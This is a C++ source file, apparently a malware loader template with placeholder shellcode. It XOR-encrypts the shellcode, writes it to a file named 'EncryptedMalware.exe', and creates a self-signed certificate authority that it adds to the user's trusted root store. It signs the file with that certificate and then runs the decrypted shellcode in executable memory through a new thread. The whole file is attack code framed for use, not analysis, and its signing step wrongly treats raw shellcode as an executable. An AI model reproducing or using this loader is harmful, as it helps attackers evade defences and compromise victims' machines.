#include <Windows.h>
#include <iostream>
#include <ctime>
#include <fstream>
#include <string>
#include <random>

// Encrypt and Decrypt Shellcode with XOR
void xorEncryptDecrypt(char* shellcode, size_t size, char key) {
    for (size_t i = 0; i < size; ++i) {
        shellcode[i] ^= key;
    }
}

// Execute Shellcode in Memory
void executeShellcode(const char* shellcode, size_t size) {
    // Allocate memory for shellcode
    LPVOID execMemory = VirtualAlloc(nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMemory) {
        std::cerr << "Memory allocation failed.\n";
        return;
    }

    // Copy decrypted shellcode to allocated memory
    RtlCopyMemory(execMemory, shellcode, size);

    // Execute the shellcode
    HANDLE hThread = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)execMemory, nullptr, 0, nullptr);
    if (!hThread) {
        std::cerr << "Thread creation failed.\n";
        VirtualFree(execMemory, 0, MEM_RELEASE);
        return;
    }
    WaitForSingleObject(hThread, INFINITE);

    // Clean up
    VirtualFree(execMemory, 0, MEM_RELEASE);
}

// Sign the Executable with a Self-Signed Certificate
void signBinary(const std::string& exePath) {
    // Commands to generate and use the self-signed certificate for signing
    system("makecert -r -pe -n \"CN=Malwr CA\" -ss CA -sr CurrentUser -a sha256 -cy authority -sky signature -sv MalwrCA.pvk MalwrCA.cer");
    system("certutil -user -addstore Root MalwrCA.cer");
    system("makecert -pe -n \"CN=Malwr Cert\" -a sha256 -cy end -sky signature -ic MalwrCA.cer -iv MalwrCA.pvk -sv MalwrCert.pvk MalwrCert.cer");
    system("pvk2pfx -pvk MalwrCert.pvk -spc MalwrCert.cer -pfx MalwrCert.pfx");
    std::string signCommand = "signtool sign /v /f MalwrCert.pfx /t http://timestamp.verisign.com/scripts/timstamp.dll " + exePath;
    system(signCommand.c_str());
}

int main() {
    // Input shellcode (replace with your actual shellcode)
    char rawShellcode[] = "\xfc\xe8\x82...";  // Replace with your shellcode
    size_t shellcodeSize = sizeof(rawShellcode) - 1;

    // Generate a random XOR key for shellcode encryption
    srand((unsigned int)time(nullptr));
    char xorKey = static_cast<char>(rand() % 256);

    // Encrypt the shellcode with XOR encryption
    xorEncryptDecrypt(rawShellcode, shellcodeSize, xorKey);

    // Write the modified binary to disk
    std::ofstream outFile("EncryptedMalware.exe", std::ios::binary);
    outFile.write(rawShellcode, shellcodeSize);
    outFile.close();

    // Sign the binary (Automatically run code-signing commands)
    signBinary("EncryptedMalware.exe");

    // Decrypt the shellcode before execution
    xorEncryptDecrypt(rawShellcode, shellcodeSize, xorKey);

    // Execute the shellcode
    executeShellcode(rawShellcode, shellcodeSize);

    std::cout << "Execution complete!\n";

    return 0;
}
